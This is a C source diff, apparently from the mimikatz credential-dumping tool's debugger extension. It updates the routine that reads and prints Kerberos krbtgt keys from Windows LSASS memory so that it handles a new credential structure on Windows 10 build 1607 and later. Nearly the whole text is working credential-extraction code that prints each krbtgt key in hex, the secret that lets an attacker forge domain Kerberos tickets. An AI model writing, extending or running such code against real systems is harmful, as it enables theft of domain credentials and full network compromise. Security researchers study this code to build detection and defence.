@@ -467,33 +467,63 @@ VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(PENC_LSAISO_DATA_BLOB blob, DWORD si
 void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
 {
 	DWORD sizeForCreds, i;
+	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
 	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
 	PVOID buffer;
 
 	if(addr)
 	{
 		dprintf("\n%s krbtgt: ", prefix);
-		if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
+		if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
 		{
-			sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
-			if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
+			if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
 			{
-				if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
+				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
+				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
 				{
-					dprintf("%u credentials\n", creds6->cbCred);
-					for(i = 0; i < creds6->cbCred; i++)
+					if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
 					{
-						dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
-						if(buffer = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
+						dprintf("%u credentials\n", creds6->cbCred);
+						for(i = 0; i < creds6->cbCred; i++)
 						{
-							if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, PtrToUlong(creds6->credentials[i].size), NULL))
-								kull_m_string_dprintf_hex(buffer, PtrToUlong(creds6->credentials[i].size), 0);
-							LocalFree(buffer);
+							dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
+							if(buffer = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
+							{
+								if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, PtrToUlong(creds6->credentials[i].size), NULL))
+									kull_m_string_dprintf_hex(buffer, PtrToUlong(creds6->credentials[i].size), 0);
+								LocalFree(buffer);
+							}
+							dprintf("\n");
 						}
-						dprintf("\n");
 					}
+					LocalFree(creds6);
 				}
-				LocalFree(creds6);
+			}
+		}
+		else
+		{
+			if(ReadMemory((ULONG_PTR) addr, &tmpCred64, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64), NULL))
+			{
+				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
+				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
+				{
+					if(ReadMemory((ULONG_PTR) addr, creds64, sizeForCreds, NULL))
+					{
+						dprintf("%u credentials\n", creds64->cbCred);
+						for(i = 0; i < creds64->cbCred; i++)
+						{
+							dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
+							if(buffer = LocalAlloc(LPTR, PtrToUlong(creds64->credentials[i].size)))
+							{
+								if(ReadMemory((ULONG_PTR) creds64->credentials[i].key, buffer, PtrToUlong(creds64->credentials[i].size), NULL))
+									kull_m_string_dprintf_hex(buffer, PtrToUlong(creds64->credentials[i].size), 0);
+								LocalFree(buffer);
+							}
+							dprintf("\n");
+						}
+					}
+					LocalFree(creds64);
+				}
 			}
 		}
 	}
